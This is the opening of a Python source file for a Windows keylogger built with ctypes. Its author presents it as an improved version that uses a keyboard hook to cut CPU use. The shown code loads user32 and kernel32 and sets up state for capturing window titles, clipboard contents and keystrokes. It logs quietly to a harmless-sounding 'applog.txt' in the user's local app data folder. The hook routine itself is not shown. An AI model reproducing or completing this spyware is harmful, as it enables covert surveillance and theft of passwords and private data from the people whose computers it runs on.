
'''
Following a good friend's advice regarding 'GetAsyncKeyState' being responsible
for the crazy CPU usage in keylogger.py , I've decided to follow his recommendation and
use 'SetWindowHookExA'.

Wasn't planning on writing a second version of the keylogger with ctypes, but hey,
One can always change their minds ey?

Using 'SetWindowHookExA' is much better and brings the CPU usage down to zero.

'''

# Start by importing required packages, load user32.dll and kernel32.dll
from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ['localappdata']+"\\" +
                    'applog.txt'), level=logging.DEBUG, format='%(message)s')

# Load the required libraries
user32 = windll.user32
kernel32 = windll.kernel32

current_window = None   # Holds the current window title
current_clipboard = []  # Holds the current clipboard content
last_key = None         # Holds the last key pressed
line = ""               # Holds the lines of keyboard characters pressed
